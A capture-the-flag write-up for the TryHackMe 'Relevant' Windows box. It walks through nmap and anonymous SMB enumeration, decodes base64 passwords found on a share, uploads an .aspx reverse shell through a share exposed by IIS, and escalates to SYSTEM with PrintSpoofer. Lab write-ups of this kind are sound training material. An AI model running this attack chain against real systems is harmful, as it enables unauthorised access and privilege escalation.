# 50 - Relevant (windows SeImpersonateToken priv esc)

Room Link --> [https://tryhackme.com/room/relevant](https://tryhackme.com/room/relevant)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.15.188 -p- -T4

PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack Microsoft HTTPAPI httpd 2.0 
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2
3389/tcp  open  ssl/ms-wbt-server? syn-ack
49663/tcp open  http               syn-ack Microsoft HTTPAPI httpd 2.0 
49667/tcp open  msrpc              syn-ack Microsoft Windows RPC
49669/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: 
```
{% endcode %}

#### SMB enum

```bash
crackmapexec smb 10.10.15.188 -u 'anonymous' -p 'anonymous' --shares
```

<figure><img src=".gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

#### SMBMAP enum

```bash
smbmap -H 10.10.15.188 -u 'anonymous' -p 'anonymous'
```

<figure><img src=".gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

We can use crackmapexec to spider through and download everyshare we have read/write access to.

{% code overflow="wrap" lineNumbers="true" %}
```bash
crackmapexec smb 10.10.168.89 -u anonymous -p '' -M spider_plus -o READ_ONLY=true
```
{% endcode %}

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can now goto `/tmp` dir and view the downloaded flles.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ cd /tmp/cme_spider_plus                                                          
                                                                                                             
┌──(dking㉿dking)-[/tmp/cme_spider_plus]
└─$ ls -al
total 24
drwxr-xr-x  3 dking dking  4096 Nov  1 06:26 .
drwxrwxrwt 35 root  root  12288 Nov  1 06:26 ..
drwxr-xr-x  3 dking dking  4096 Nov  1 06:26 10.10.168.89
-rw-r--r--  1 dking dking   245 Nov  1 06:26 10.10.168.89.json

┌──(dking㉿dking)-[/tmp/cme_spider_plus]
└─$ cat 10.10.168.89.json         
{
    "nt4wrksv": {
        "passwords.txt": {
            "atime_epoch": "2020-07-25 16:13:05",
            "ctime_epoch": "2020-07-25 16:13:05",
            "mtime_epoch": "2020-07-25 16:35:44",
            "size": "98 Bytes"
        }
    }
}                                                                                                             
┌──(dking㉿dking)-[/tmp/cme_spider_plus]
└─$ cd 10.10.168.89        
                                                                                                             
┌──(dking㉿dking)-[/tmp/cme_spider_plus/10.10.168.89]
└─$ ls -al
total 12
drwxr-xr-x 3 dking dking 4096 Nov  1 06:26 .
drwxr-xr-x 3 dking dking 4096 Nov  1 06:26 ..
drwxr-xr-x 2 dking dking 4096 Nov  1 06:26 nt4wrksv
                                                                                                             
┌──(dking㉿dking)-[/tmp/cme_spider_plus/10.10.168.89]
└─$ ls -al nt4wrksv 
total 12
drwxr-xr-x 2 dking dking 4096 Nov  1 06:26 .
drwxr-xr-x 3 dking dking 4096 Nov  1 06:26 ..
-rw-r--r-- 1 dking dking   98 Nov  1 06:26 passwords.txt

┌──(dking㉿dking)-[/tmp/cme_spider_plus/10.10.168.89/nt4wrksv]
└─$ cat passwords.txt    
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
{% endcode %}

There are some encoded passwords here.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# decoded passwords.
┌──(dking㉿dking)-[~/Downloads]
└─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
Bob - !P@$$W0rD!123                                                                                                                    
┌──(dking㉿dking)-[~/Downloads]
└─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```
{% endcode %}

Since we have access to `IPC$` shar, we could enumerate users anonymously.

{% code overflow="wrap" lineNumbers="true" %}
```bash
/usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.168.89 | grep SidTypeUser

500: RELEVANT\Administrator (SidTypeUser)
501: RELEVANT\Guest (SidTypeUser)
503: RELEVANT\DefaultAccount (SidTypeUser)
1002: RELEVANT\Bob (SidTypeUser)

# we got Bob. But thats by the way, since we already got his credentials.
```
{% endcode %}

I tried to login using psexec but it did't work.

{% code overflow="wrap" lineNumbers="true" %}
```bash
/usr/share/doc/python3-impacket/examples/psexec.py 'bill:Juw4nnaM4n420696969!$$$@10.10.168.89'
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Web Enumeratioon

Navigating to the http server, `10.10.117.41:49663` -&#x20;

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# nmap default script scan for port 49663.
49663/tcp open  http    syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows Servert
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
```
{% endcode %}

#### FFUF enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u http://10.10.117.41:49663/FUZZ -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403,400 -t 500 -ic

# the only dir found was at the latter end
┌──(dking㉿dking)-[~]
└─$ grep nt4wrksv /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -n
220538:nt4wrksv
```
{% endcode %}

### Initial Access

Navigating to the dir: `http://10.10.117.41:49663/nt4wrksv/`- we see its same as the SMB share dir. So `http://10.10.117.41:49663/nt4wrksv/passwords.txt`  -

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Meaning we are accessing the SMB share on the webserver. So we can put a malicious `.asp or .aspx` file to get reverse shell. Setup nc listener and we get a shell by executing the `.aspx` file on the server.

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see user.txt flag in Bob dir.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

Since we are service account, we have the `seimpersonate` privs.

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I already have a writeup for priv esc using `seimpersonate` [privileges](6-windows-priv-esc.md#15-token-impersonation-printspoofer) .

Upload `printspoofer.exe` into the windows machine.

```bash
.\PrintSpoofer.exe -i -c cmd
```

And we should get `nt/authority system` .

Done!

